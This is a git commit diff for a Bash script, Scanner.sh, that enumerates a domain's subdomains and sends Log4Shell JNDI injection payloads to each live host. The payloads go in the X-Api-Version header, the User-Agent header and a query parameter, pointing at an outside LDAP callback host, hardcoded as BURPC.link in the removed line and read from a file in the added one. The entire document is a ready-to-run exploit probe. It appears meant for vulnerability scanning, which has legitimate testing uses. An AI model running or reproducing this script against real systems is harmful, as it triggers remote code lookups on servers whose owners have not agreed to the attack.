eab02a8b46a57a45ebf3efa54a4b54527a3d3c4d
Som Chandra <85082756+Somchandra17@users.noreply.github.com>
2024-04-19 18:53:59 +0530

    Update Scanner.sh

--- Scanner.sh
+++ Scanner.sh
@@ -1,1 +1,8 @@
-subfinder -d domain.com -silent |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://BURPC.link/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://BURPC.link/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://BURPC.link/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done
+while read -r collaborator_link; do
+    subfinder -d domain.com -silent | httprobe | while read url; do 
+        case1=$(curl -s "$url" -H "X-Api-Version: \${jndi:$collaborator_link}")
+        case2=$(curl -s "$url/?test=\${jndi:$collaborator_link}")
+        case3=$(curl -s "$url" -H "User-Agent: \${jndi:$collaborator_link}")
+        echo -e "\033[43mDOMAIN => $url\033[0m\n Case1=> X-Api-Version: running-Ldap-payload\n Case2=> Useragent: running-Ldap-payload\n Case3=> $url/?test=running-Ldap-payload\n"
+    done
+done < collaborator_links.txt
